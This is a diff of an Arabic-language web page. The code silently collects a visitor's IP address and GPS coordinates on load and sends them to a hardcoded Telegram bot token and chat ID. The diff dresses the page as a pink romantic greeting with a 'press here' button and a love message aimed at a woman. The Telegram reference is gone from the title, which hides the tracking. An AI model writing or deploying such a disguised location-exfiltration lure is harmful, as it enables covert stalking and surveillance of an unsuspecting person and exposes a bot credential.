@@ -1,14 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>تحديد الموقع وإرساله لتليجرام</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>💕 تحديد الموقع 💕</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #ffe0e9, #fffaf5);
+      font-family: 'Tajawal', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+      color: #c2185b;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #d81b60;
+    }
+
+    button {
+      background-color: #ec407a;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 18px;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.15);
+    }
+
+    button:hover {
+      background-color: #ad1457;
+      transform: scale(1.06);
+    }
+
+    .popup {
+      display: none;
+      margin-top: 30px;
+      background: #fff0f8;
+      border: 2px dashed #ec407a;
+      padding: 20px 30px;
+      border-radius: 16px;
+      font-size: 22px;
+      color: #e91e63;
+      animation: fadeIn 0.7s ease;
+      max-width: 90%;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 20px;
+      }
+
+      button {
+        padding: 12px 24px;
+        font-size: 16px;
+      }
+
+      .popup {
+        font-size: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <h2 style="text-align:center;">جارٍ تحديد موقعك...</h2>
+  <h2>📍 جارٍ تحديد موقعك...</h2>
+  <button onclick="showLove()">💕 اضغطي هنا 💕</button>
+  <div class="popup" id="popup">💖 كنحبك 💖</div>
+
   <script>
-    const BOT_TOKEN = "7838285515:AAFIhk3dSkC-q3vfjxVUbxgApUl1ze20II0"; // حط توكن البوت هنا
-    const CHAT_ID = "7424074346"; // حط chat id هنا
+    const BOT_TOKEN = "7838285515:AAFIhk3dSkC-q3vfjxVUbxgApUl1ze20II0";
+    const CHAT_ID = "7424074346";
 
     async function sendTelegramMessage(text) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -25,12 +100,12 @@
         });
         const data = await res.json();
         if (data.ok) {
-          console.log("✅ الرسالة تم إرسالها بنجاح");
+          console.log("✅ تم إرسال الرسالة");
         } else {
-          console.error("❌ خطأ في إرسال الرسالة:", data);
+          console.error("❌ خطأ:", data);
         }
       } catch (e) {
-        console.error("❌ خطأ في fetch:", e);
+        console.error("❌ فشل في fetch:", e);
       }
     }
 
@@ -52,7 +127,7 @@
 🌐 IP: ${ip}
 📌 خط العرض: ${lat}
 📍 خط الطول: ${lon}
-🔗 [فتح الموقع في الخريطة](${mapsLink})
+🔗 [فتح في الخريطة](${mapsLink})
 📡 المصدر: GPS ✅
       `;
     }
@@ -69,14 +144,19 @@
             await sendTelegramMessage(message);
           },
           (err) => {
-            console.error("⚠️ رفضت أو فشل الحصول على الموقع:", err.message);
-            alert("لم يتم الحصول على الموقع. رجاءً اقبل السماح للموقع.");
+            console.error("⚠️ ما قدرناش نجيب الموقع:", err.message);
+            alert("خاصك تسمح للموقع باش نخدمو.");
           },
           { timeout: 10000 }
         );
       } else {
-        alert("المتصفح لا يدعم ميزة تحديد الموقع.");
+        alert("المتصفح ديالك ما فيه geolocation.");
       }
+    }
+
+    function showLove() {
+      const popup = document.getElementById("popup");
+      popup.style.display = "block";
     }
 
     window.onload = init;
